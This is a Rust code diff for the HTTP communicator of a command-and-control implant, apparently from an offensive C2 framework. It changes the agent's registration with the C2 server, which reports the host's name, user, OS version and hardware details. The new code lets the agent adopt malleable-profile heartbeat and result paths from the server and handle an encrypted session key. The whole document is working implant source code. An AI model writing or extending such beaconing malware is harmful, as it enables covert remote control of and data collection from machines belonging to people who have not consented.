@@ -10,6 +10,15 @@ use reqwest::Client;
 
 const AES_KEY_SIZE: usize = 32;
 
+/// Result of a successful registration, including the profile paths the server
+/// wants the agent to use for subsequent heartbeats/results.
+pub struct RegisterOutcome {
+    pub agent_id: String,
+    pub session_key: Option<Vec<u8>>,
+    pub heartbeat_path: String,
+    pub result_path: String,
+}
+
 /// HTTP communicator for beacon-style communication with the C2 server.
 pub struct HttpCommunicator {
     client: Client,
@@ -55,11 +64,11 @@ impl HttpCommunicator {
         format!("{}{}", self.server_url, self.result_path)
     }
 
-    /// Register with the C2 server.
-    /// Returns the assigned agent_id and (if present) the RSA-encrypted
-    /// AES session key as raw bytes.
+    /// Register with the C2 server and adopt the profile paths it returns.
+    /// Returns the assigned agent_id, the RSA-encrypted AES session key (if
+    /// any), and the heartbeat/result paths to use going forward.
     pub async fn register(
-        &self,
+        &mut self,
         hostname: &str,
         user_name: &str,
         os_version: &str,
@@ -67,7 +76,7 @@ impl HttpCommunicator {
         public_key: &str,
         beacon_secret: &str,
         hardware_json: &str,
-    ) -> Result<(String, Option<Vec<u8>>), String> {
+    ) -> Result<RegisterOutcome, String> {
         let pid = std::process::id();
         let hw = if hardware_json.is_empty() || hardware_json == "null" {
             "null"
@@ -106,7 +115,25 @@ impl HttpCommunicator {
 
         let session_key = extract_optional_b64(&body, "session_key");
 
-        Ok((agent_id, session_key))
+        // Adopt the malleable-profile paths the server returned (fall back to
+        // the build-time paths when the field is absent).
+        if let Some(hb) = extract_string(&body, "heartbeat_url") {
+            if !hb.is_empty() {
+                self.heartbeat_path = hb;
+            }
+        }
+        if let Some(r) = extract_string(&body, "result_url") {
+            if !r.is_empty() {
+                self.result_path = r;
+            }
+        }
+
+        Ok(RegisterOutcome {
+            agent_id,
+            session_key,
+            heartbeat_path: self.heartbeat_path.clone(),
+            result_path: self.result_path.clone(),
+        })
     }
 
     /// Send a heartbeat and receive a pending task (if any).
